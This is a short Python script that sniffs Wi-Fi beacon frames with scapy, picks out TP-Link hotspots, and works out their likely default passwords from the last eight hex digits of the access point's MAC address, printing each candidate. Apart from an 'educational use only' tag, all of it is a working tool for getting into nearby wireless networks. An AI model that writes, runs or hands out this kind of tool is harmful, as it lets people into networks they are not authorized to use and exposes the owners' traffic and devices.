#!/usr/bin/env python3
from argparse import ArgumentParser
from scapy.sendrecv import sniff
from scapy.layers.dot11 import Dot11

parser = ArgumentParser(description="Python script for trying default passwords for some TP-Link Hotspots",
                        epilog="FOR EDUCATIONAL USE ONLY")
args = parser.parse_args()

CONFIG = {
    "verify": False,  # verify if mac_address in ssid
    "timeout": 10,  # stop sniffing after a given time
    "print_all": False  # print all found ssid's
}
endpoints = {
    # mac_address: [ssid, password]
}


def count_passwords():
    return len(generate_password_list())


def generate_password_list():
    passwords = []
    for endpoint in endpoints.keys():
        password = endpoints[endpoint][1]
        if password:
            passwords.append(password)
    return passwords


def is_tp_link(ssid):
    return ssid.lower().startswith("tp-link")


def get_password(mac_address):
    return mac_address.replace(":", "")[-8:]


def verify_password(ssid, password):
    return password[-6:] in ssid


def packet_handler(packet):
    if packet.haslayer(Dot11) and packet.type == 0 and packet.subtype == 8:
        try:
            ssid = packet.info.decode("utf-8")
            mac_address = str(packet.addr2)
            if not endpoints.get(mac_address) and not ssid == "":
                if CONFIG["print_all"] or is_tp_link(ssid):
                    print(f"\nSSID: {ssid} \nMac Address: {mac_address}")
                if is_tp_link(ssid):
                    password = get_password(mac_address)
                    valid = verify_password(ssid, password)
                    print(f"Password: {password}")
                    if CONFIG["verify"]:
                        print(f"Validity: {valid}")
                    endpoints[mac_address] = [ssid, password]
                else:
                    endpoints[mac_address] = [ssid, None]
        except:
            pass


def main():
    try:
        print("Scanning...")
        sniff(prn=packet_handler, store=False,
              monitor=True, timeout=CONFIG["timeout"])
        print("Finishing up...")
        print(f"Found {len(endpoints)} endpoints")
        print(f"Found {count_passwords()} passwords")
        # print(repr(endpoints))
    except KeyboardInterrupt:
        print("Exiting...")
        exit(0)


if __name__ == '__main__':
    main()
